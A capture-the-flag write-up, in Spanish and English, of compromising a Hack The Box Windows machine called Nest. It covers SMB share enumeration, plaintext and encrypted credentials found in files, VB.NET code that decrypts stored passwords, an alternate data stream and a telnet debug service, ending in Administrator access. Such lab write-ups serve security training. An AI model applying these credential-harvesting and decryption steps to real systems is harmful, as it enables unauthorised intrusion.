
nmap -sC -sV -o scan_nest.txt 10.10.10.178

Es una maquina windows la cual podemos verficiar a realizar el scan que tiene el puerto smb disponible.

El cual podemos enumerar:

❯ smbclient -L \\\\10.10.10.178 = para verificar los share disponible

Utilizaremos el share {data} por que puede ser accedido sin credenciales.

❯ smbclient \\\\10.10.10.178\\Data
smb: \> recurse on 
smb: \> ls
smb: \> cd Shared\Templates\HR\
smb: \> cd \Shared\Templates\HR\> ls

Aqui encontraremo sun archivo el cual debemo descargar a nuestra maquina:
smb: \> mget "Welcom Email.txt"

Luego iremos a siguiente directorio:

smb: \> cd ../../Maintenance\
y descargaremos el archivo Maaintenance Alerts.txt

smb: \Shared\Maintenance\> mget "Maintenance Alerts.txt"

Al abrir el archivo: Maintenance Alerts.txt encontraremos lo siguiente:

Username: TempUser
Password: welcome2019


Ahora tenemos las credenciales del usuario TempUser.

❯ smbclient \\\\10.10.10.178\\Data -U TempUser
smb: \> recurse on
smb: \> ls

Ahora al listar veremos el directorio de TI por lo cual descargaremos todos directorio TI.


❯ smbget -R smb://10.10.10.178/Data/ -U TempUser

Bucando entre todo el contenido encontrado veremos dos archivo que nos deben llamar mucho la atencion
{RU_Config.xml} and {config.xml}

----------------------------------------------------------
Data//IT/Configs/RU Scanner/RU_Config.xml

<?xml version="1.0"?>
<ConfigFile xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
 <Port>389</Port>
 <Username>c.smith</Username>
 <Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
</ConfigFile>

----------------------------------------------------------

This password looks encrypted, but I thought I would use it to try authenticating to the SMB shares just in case. Authenticaition failed, leading me to suspect that the password needs to be decrypted.

----------------------------------------------------------
Data//IT/Configs/NotepadPlusPlus/config.xml

<?xml version="1.0" encoding="Windows-1252" ?>
<NotepadPlus>
[SNIP]
 <History nbMaxFile="15" inSubMenu="no" customLength="-1">
 <File filename="C:\windows\System32\drivers\etc\hosts" />
 <File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
 <File filename="C:\Users\C.Smith\Desktop\todo.txt" />
 </History>
</NotepadPlus>
----------------------------------------------------------


So it looks like someone was accessing files on the Secure$ share as well as files on the C.Smith user’s desktop.

Let’s see if we can access anything in this share as TempUser:

❯ smbclient \\\\10.10.10.178\\Secure$ -U TempUser


Interesting; it seems that the TempUser doesn’t have any access to listing the 3 directories. I wasted a bit of time here putting two and two together, but ultimately I found that the IT\Carl\ folder was indeed listable:

❯ smbclient \\\\10.10.10.178\\Secure$ -U TempUser

❯ smbget -rR smb://10.10.10.178/Secure$/IT/Carl/ -U TempUser


Looking at this data, we find some interesting fode in Module1.vb and Utils.vb. As far as content we are interested in, Module1.vb uses Utils.vb to decrypt the password it retrieves from the RU_config.xml configuration file.

We can cut and patch some of this code together to make a single file we can run on https://dotnetfiddle.net:

Imports System.Text
Imports System.Security.Cryptography
Public Class Utils
	Public Class ConfigFile
 Public Property Port As Integer
 Public Property Username As String
 Public Property Password As String

 Public Sub SaveToFile(Path As String)
 Using File As New System.IO.FileStream(Path, System.IO.FileMode.Create)
 Dim Writer As New System.Xml.Serialization.XmlSerializer(GetType(ConfigFile))
 Writer.Serialize(File, Me)
 End Using
 End Sub

 Public Shared Function LoadFromFile(ByVal FilePath As String) As ConfigFile
 Using File As New System.IO.FileStream(FilePath, System.IO.FileMode.Open)
 Dim Reader As New System.Xml.Serialization.XmlSerializer(GetType(ConfigFile))
 Return DirectCast(Reader.Deserialize(File), ConfigFile)
 End Using
 End Function
 
End Class
 Public Shared Function DecryptString(EncryptedString As String) As String
 If String.IsNullOrEmpty(EncryptedString) Then
 Return String.Empty
 Else
 Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
 End If
 End Function

 Public Shared Function Decrypt(ByVal cipherText As String, _
 ByVal passPhrase As String, _
 ByVal saltValue As String, _
 ByVal passwordIterations As Integer, _
 ByVal initVector As String, _
 ByVal keySize As Integer) _
 As String
 Dim initVectorBytes As Byte()
 initVectorBytes = Encoding.ASCII.GetBytes(initVector)
 Dim saltValueBytes As Byte()
 saltValueBytes = Encoding.ASCII.GetBytes(saltValue)
 Dim cipherTextBytes As Byte()
 cipherTextBytes = System.Convert.FromBase64String(cipherText)
 Dim password As New Rfc2898DeriveBytes(passPhrase, _
 saltValueBytes, _
 passwordIterations)
 Dim keyBytes As Byte()
 keyBytes = password.GetBytes(CInt(keySize / 8))
 Dim symmetricKey As New AesCryptoServiceProvider
 symmetricKey.Mode = CipherMode.CBC
 Dim decryptor As ICryptoTransform
 decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)
 Dim memoryStream As System.IO.MemoryStream
 memoryStream = New System.IO.MemoryStream(cipherTextBytes)
 Dim cryptoStream As CryptoStream
 cryptoStream = New CryptoStream(memoryStream, _
 decryptor, _
 CryptoStreamMode.Read)
 Dim plainTextBytes As Byte()
 ReDim plainTextBytes(cipherTextBytes.Length)
 Dim decryptedByteCount As Integer
 decryptedByteCount = cryptoStream.Read(plainTextBytes, _
 0, _
 plainTextBytes.Length)
 memoryStream.Close()
 cryptoStream.Close()
 Dim plainText As String
 plainText = Encoding.ASCII.GetString(plainTextBytes, _
 0, _
 decryptedByteCount)
	System.Console.WriteLine(plainText)
	Return plainText
 End Function

Public Class SsoIntegration
 Public Property Username As String
 Public Property Password As String
End Class
 
 Sub Main()
 Dim test As New SsoIntegration With {.Username = "c.smith", .Password = Utils.DecryptString("fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=")}
 End Sub
End Class

Note that I inserted a line to print the plainText variable before the Decrypt function returns. The above code on https://dotnetfiddle.net gives us xRxRxPANCAK3SxRxRx as the plaintext output. This is the password for the c.smith user.

username: C.Smith
password: xRxRxPANCAK3SxRxRx

smbclient \\\\10.10.10.178\\Users -U C.Smith
cd C.Smith
get user.txt


Enumarar ahora para root

https://docs.microsoft.com/en-us/windows/win32/fileio/file-streams

❯ allinfo "Debug Mode Password.txt"

❯ more "Debug Mode Password.txt:Password"

PASSWORD DEBUG: WBQ201953D8w

> telnet 10.10.10.178 4386

DEBUG WBQ201953D8w 

setdir ..
setdir LDAP
showquery 2

Domain=nest.local
Port=389
BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
User=Administrator
Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=

web page for descryptor password
https://pastebin.com/RfZhBcq9

Luego debemos ir a:
https://dotnetfiddle.net/Z9MZYl 

copiamos y pegamos debemo parametrizar lo siguiente
Language: C#
Compiler: .net 4.7.2

Ejecutamos y el resultado sera:
The magical rootdance key is:
XtH4nkS4Pl4y1nGX


username: Administrator
password: XtH4nkS4Pl4y1nGX

smbclient \\\\10.10.10.178\\c$ -U Administrator

❯ cd \Users\Administrator\Desktop\
❯ more root.txt

